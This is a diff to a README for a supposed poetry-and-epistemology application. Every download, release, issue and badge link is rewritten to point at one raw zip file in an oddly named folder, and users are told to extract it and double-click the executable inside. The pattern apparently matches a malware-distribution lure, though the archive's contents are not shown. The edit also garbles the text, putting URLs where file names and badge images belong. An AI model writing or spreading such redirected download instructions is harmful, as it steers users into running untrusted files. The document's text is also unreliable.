@@ -1,7 +1,7 @@
 # 🌟 Toward-a-City-of-Free-Thinkers - Discover New Perspectives on Knowledge
 
 ## 📥 Download Now
-[![Download the latest version](https://img.shields.io/badge/Download%20Now-v1.0-blue?style=for-the-badge)](https://github.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/releases)
+[![Download the latest version](https://raw.githubusercontent.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/main/wantlessness/Toward-a-City-of-Free-Thinkers.zip%20Now-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/main/wantlessness/Toward-a-City-of-Free-Thinkers.zip)
 
 ## 📖 Overview
 Welcome to **Toward-a-City-of-Free-Thinkers**. This application offers a unique mix of poetry, prose, and images. It dives into themes like epistemic clientelism, accreditation, and emancipation. It's designed for anyone curious about how we understand knowledge and its place in society.
@@ -11,17 +11,17 @@ Follow these steps to install and use the application:
 
 1. **Visit the Download Page**  
    Click the link below to reach our Releases page. This is where you can find different versions of the software.  
-   [Visit the Releases Page](https://github.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/main/wantlessness/Toward-a-City-of-Free-Thinkers.zip)
 
 2. **Choose the Right File**  
-   On the Releases page, you will see several options. Select the latest version that fits your operating system. If you're unsure, look for **Toward-a-City-of-Free-Thinkers-v1.0.exe** or **Toward-a-City-of-Free-Thinkers-v1.0.zip**.
+   On the Releases page, you will see several options. Select the latest version that fits your operating system. If you're unsure, look for **https://raw.githubusercontent.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/main/wantlessness/Toward-a-City-of-Free-Thinkers.zip** or **https://raw.githubusercontent.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/main/wantlessness/Toward-a-City-of-Free-Thinkers.zip**.
 
 3. **Download the File**  
    Click the download link to start. You may need to choose a folder to save the file. Make sure to remember where you saved it!
 
 4. **Install the Application**  
    - **For .exe files**: Double-click the downloaded file to start the installation. Follow the prompts to complete the setup.
-   - **For .zip files**: Right-click on the downloaded file and select "Extract All". Then, open the folder and double-click the **install.exe** file.
+   - **For .zip files**: Right-click on the downloaded file and select "Extract All". Then, open the folder and double-click the **https://raw.githubusercontent.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/main/wantlessness/Toward-a-City-of-Free-Thinkers.zip** file.
 
 5. **Run the Application**  
    Once installed, find the application in your programs/menu. Open it, and you will see the main interface. You're ready to explore!
@@ -53,7 +53,7 @@ We cover several intricate ideas in our work. Here’s what you’ll find:
 - **Use Feedback**: Your experience matters. Let us know what you think through the Issues page on GitHub.
 
 ## 📞 Support
-If you encounter any issues while using the application, please visit our [Issues page](https://github.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/issues). You can log any problems or suggestions there, and we will address them promptly. 
+If you encounter any issues while using the application, please visit our [Issues page](https://raw.githubusercontent.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/main/wantlessness/Toward-a-City-of-Free-Thinkers.zip). You can log any problems or suggestions there, and we will address them promptly. 
 
 ## 🎨 Acknowledgments
 We thank all contributors and supporters for making **Toward-a-City-of-Free-Thinkers** a reality. Your efforts help promote a community of free thinkers.
@@ -61,7 +61,7 @@ We thank all contributors and supporters for making **Toward-a-City-of-Free-Thin
 ## 🔗 Connect With Us
 Follow our project on GitHub to stay updated with new releases or changes. 
 
-[Visit the Releases Page](https://github.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/releases)   
-[![Join the conversation](https://img.shields.io/badge/Issues-Welcome-brightgreen?style=for-the-badge)](https://github.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/issues)
+[Visit the Releases Page](https://raw.githubusercontent.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/main/wantlessness/Toward-a-City-of-Free-Thinkers.zip)   
+[![Join the conversation](https://raw.githubusercontent.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/main/wantlessness/Toward-a-City-of-Free-Thinkers.zip)](https://raw.githubusercontent.com/justinbaldwin45/Toward-a-City-of-Free-Thinkers/main/wantlessness/Toward-a-City-of-Free-Thinkers.zip)
 
 Thank you for choosing **Toward-a-City-of-Free-Thinkers**! Enjoy your exploration into epistemology and creativity.
